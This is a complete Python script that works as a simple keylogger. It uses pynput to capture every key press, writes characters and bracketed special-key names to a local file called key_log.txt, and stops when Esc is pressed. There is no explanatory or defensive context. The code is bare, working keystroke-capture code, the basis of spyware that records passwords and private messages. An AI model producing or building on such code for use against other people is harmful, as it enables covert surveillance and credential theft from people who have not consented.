from pynput.keyboard import Key, Listener

def on_press(key):
    """Handle key press"""
    try:
        with open('key_log.txt', 'a') as f:
            key_str = str(key)  # Convert key to string
            
            if key_str == 'Key.space':  # Explicitly check for space key
                f.write('\n')  # Write a newline for space
            elif hasattr(key, 'char') and key.char is not None:  # Regular keys
                f.write(key.char)
            elif key_str == 'Key.enter':  # Enter key
                f.write('\n')
            else:  # Other special keys
                f.write(f'[{key_str}]')
    except Exception as e:
        print(e)

def on_release(key):
    """Handle key release"""
    if key == Key.esc:
        # Stop listener
        return False

if __name__ == '__main__':
    # Start listening
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
